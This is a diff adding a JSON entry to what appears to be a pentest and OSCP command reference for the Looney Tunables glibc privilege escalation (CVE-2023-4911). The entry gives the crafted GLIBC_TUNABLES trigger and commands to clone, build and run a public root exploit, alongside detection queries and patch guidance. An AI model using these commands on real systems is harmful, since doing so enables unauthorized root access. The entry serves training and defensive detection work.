@@ -1,0 +1,105 @@
+{
+  "id": "linux-looney-tunables",
+  "name": "Looney Tunables - glibc ld.so GLIBC_TUNABLES LPE (CVE-2023-4911)",
+  "command": "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A... <suid_binary>",
+  "description": "CVE-2023-4911 (Looney Tunables) is a buffer overflow in glibc's dynamic loader ld.so when it processes the GLIBC_TUNABLES environment variable. Because ld.so runs with elevated privileges for SUID binaries, a crafted GLIBC_TUNABLES value corrupts memory during startup of any SUID-root program and yields a local root shell. Affects glibc 2.34 through 2.38 as shipped on Fedora 37/38, Ubuntu 22.04/23.04, Debian 12/13 and others.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Kernel and glibc Exploits",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "Qualys TRU / CVE-2023-4911",
+  "tags": [
+    "cve-2023-4911",
+    "looney-tunables",
+    "glibc",
+    "ld.so",
+    "privesc",
+    "buffer-overflow"
+  ],
+  "mitre": [
+    "T1068"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== WHAT IT IS ===\n  A buffer overflow in __tunables_init() when ld.so parses GLIBC_TUNABLES. SUID binaries\n  still honor a sanitized tunables string, and the overflow happens before privileges drop,\n  so a crafted value overwrites the saved stack/state and hijacks execution as root.\n\n=== CHECK GLIBC VERSION ===\n  ldd --version                 # 'ldd (GNU libc) 2.35' etc\n  getconf GNU_LIBC_VERSION\n  # Vulnerable: 2.34 - 2.38 (released 2021-08 .. 2023-07) before the 2023-10 fix.\n\n=== TRIGGER (manual probe) ===\n  # A long malformed tunable crashes a SUID binary (proof it parses attacker input):\n  env -i 'GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=AAAA..(very long)..' /usr/bin/su --help\n  # A segfault in ld.so confirms the parser reaches the vulnerable path.\n\n=== PUBLIC PoC ===\n  git clone https://github.com/leesh3288/CVE-2023-4911\n  cd CVE-2023-4911 && gcc -o exp exp.c && ./exp\n  # Other PoCs: RootkitSmith/CVE-2023-4911, drmchen, flyyy chain the overflow to a root shell\n  # by corrupting ld.so state so a chosen library/symbol runs as root.\n\n=== TARGET BINARY ===\n  # Any SUID-root dynamically-linked binary works as the vector; /usr/bin/su and\n  # mount/umount/sudo are common. ls -la /usr/bin/su to confirm the SUID bit.\n\n=== ALTERNATIVES ===\n  dirtypipe / overlayfs CVE-2023-0386 / nf_tables CVE-2024-1086   # other local root chains",
+  "examples": [
+    {
+      "label": "Confirm glibc version (2.34-2.38 vulnerable)",
+      "command": "ldd --version"
+    },
+    {
+      "label": "Build and run a public PoC to root",
+      "command": "git clone https://github.com/leesh3288/CVE-2023-4911 && cd CVE-2023-4911 && gcc -o exp exp.c && ./exp"
+    },
+    {
+      "label": "Confirm root after exploitation",
+      "command": "id"
+    }
+  ],
+  "references": [
+    {
+      "title": "NVD - CVE-2023-4911",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4911"
+    },
+    {
+      "title": "Qualys TRU advisory (Looney Tunables)",
+      "url": "https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt"
+    },
+    {
+      "title": "PoC - leesh3288/CVE-2023-4911",
+      "url": "https://github.com/leesh3288/CVE-2023-4911"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "kernel-exploit-generic",
+      "note": "Same goal (local root) via a kernel bug when glibc is patched.",
+      "rel": "alternative"
+    },
+    {
+      "id": "linux-overlayfs-cve-2023-0386",
+      "note": "Another 2023 local-root chain to try alongside this one.",
+      "rel": "alternative"
+    },
+    {
+      "id": "find-suid-sgid",
+      "note": "Enumerate SUID binaries to pick a vector for the overflow.",
+      "rel": "prereq"
+    }
+  ],
+  "defense": {
+    "why_it_works": "glibc's ld.so sanitizes GLIBC_TUNABLES for SUID binaries but a bug in __tunables_init() mishandles an attacker-controlled tunable of the form name=name=value, overflowing a stack buffer during loader initialization. This happens before the SUID program drops privileges, so memory corruption executes with root's effective UID.",
+    "prerequisites": "A local unprivileged shell and any SUID-root dynamically-linked binary. Vulnerable glibc 2.34-2.38 (default on Fedora 37/38, Ubuntu 22.04/23.04, Debian 12) with no 2023-10 patch.",
+    "impact": "Reliable local privilege escalation to root on default installations - one of the most widely exploitable Linux LPEs of 2023 because the vector (SUID + stock glibc) is near-universal.",
+    "detection": "[MITRE T1068] Processes spawned with a GLIBC_TUNABLES value containing a repeated tunable name (name=name=) or an abnormally long value; SUID binaries (su, mount, sudo) crashing in ld.so; a root shell parented to an unprivileged process immediately after a short-lived SUID exec.",
+    "artifacts": "auditd execve records capturing GLIBC_TUNABLES in the environment; core dumps / dmesg segfault entries for ld.so inside SUID binaries; EDR process-tree showing uid=0 child of an unprivileged user.",
+    "splunk_spl": "index=linux sourcetype=\"linux:auditd\" type=EXECVE\n| search a0=\"*GLIBC_TUNABLES*\" OR proctitle=\"*GLIBC_TUNABLES*glibc.malloc*\"\n| table _time, host, auid, exe, proctitle",
+    "elastic_kql": "process.env_vars:*GLIBC_TUNABLES* and process.env_vars:*glibc.malloc.mxfast=glibc.malloc*",
+    "sentinel_kql": "DeviceProcessEvents\n| where ProcessCommandLine has \"GLIBC_TUNABLES\" and ProcessCommandLine has \"glibc.malloc\"\n| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine\n| sort by TimeGenerated desc\n// repeated tunable name (name=name=) overflowing ld.so in a SUID binary",
+    "sigma_rules": "lnx_glibc_tunables_suid_overflow (GLIBC_TUNABLES repeated-name overflow against a SUID binary)",
+    "prevention": "Patch glibc to the fixed build (Fedora glibc-2.38-11+, Ubuntu 2.35-0ubuntu3.4 / 2.37-0ubuntu2.1, Debian 2.36-9+deb12u3) released 2023-10-03. Where patching lags, strip the SUID bit from non-essential binaries and deploy with the hardened loader. Monitor auditd execve for GLIBC_TUNABLES.",
+    "sources": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-4911",
+      "https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "GLIBC_TUNABLES overflow against SUID binary (Looney Tunables)",
+        "logic": "DeviceProcessEvents\n| where ProcessCommandLine has \"GLIBC_TUNABLES\" and ProcessCommandLine has \"glibc.malloc\"\n| extend repeated = ProcessCommandLine has \"=glibc.malloc.mxfast=glibc.malloc.mxfast=\"\n| where repeated or strlen(ProcessCommandLine) > 400\n| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine",
+        "data_source": "linux-audit",
+        "attack": [
+          "T1068"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate tuning of glibc.malloc via GLIBC_TUNABLES is rare and never uses a repeated tunable name.",
+        "tuning": "Alert on the repeated name=name= pattern or abnormally long values; allowlist known performance-tuning wrappers."
+      }
+    ]
+  }
+}
